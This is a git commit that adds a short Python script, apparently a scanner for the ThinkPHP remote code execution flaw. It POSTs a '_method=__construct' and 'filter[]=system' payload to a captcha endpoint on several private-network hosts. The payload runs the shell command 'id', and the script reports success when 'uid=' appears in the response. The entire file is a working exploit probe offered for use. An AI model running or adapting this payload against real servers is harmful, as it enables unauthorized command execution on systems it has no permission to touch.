f63e3a03dacd73905757b32b72a6406e423fd311
momika233 <56291820+momika233@users.noreply.github.com>
2022-06-13 22:56:31 +0800

    Update and rename inf0.php to tp_tp.py

---
+++ tp_tp.py
@@ -0,0 +1,20 @@
+import requests,re
+
+url="http://192.168.0.68:8001/index.php?s=captcha"
+url="https://192.168.0.96/index.php?s=captcha"
+url="http://192.168.0.68:8003/index.php?s=captcha"
+url="http://192.168.0.68:8002/index.php?s=captcha"
+url="https://192.168.0.77/index.php?s=captcha"
+url="https://192.168.0.97/index.php?s=captcha"
+
+
+headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+
+data={"_method:__construct","filter[]:system","method:get","server[REQUEST_METHOD]:id"}
+
+aa=requests.post(url,headers=headers,data=data,verify=False).text
+
+if "uid=" in str(aa):
+	print ("yes",url)
+else:
+	print ("no")
